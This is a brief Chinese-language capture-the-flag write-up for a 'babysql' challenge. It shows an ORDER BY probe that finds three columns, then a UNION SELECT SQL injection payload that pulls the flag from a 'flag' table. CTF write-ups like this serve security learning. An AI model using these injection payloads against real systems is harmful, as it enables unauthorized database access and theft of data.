## babysql

- 简单的sql注入

  ![sqlpage](./sql_page.png)

  根据输入的id查询用户名和密码

  `id=-1' order by 1,2,3,4 #`时回显消失，所以一共是就3列数据

  然后删除线那里给了表名，直接`union select`就能拿到`flag`，payload:

  `id=-1' union select 1,flag,3 from flag #`

  ![sql](./sql.png)

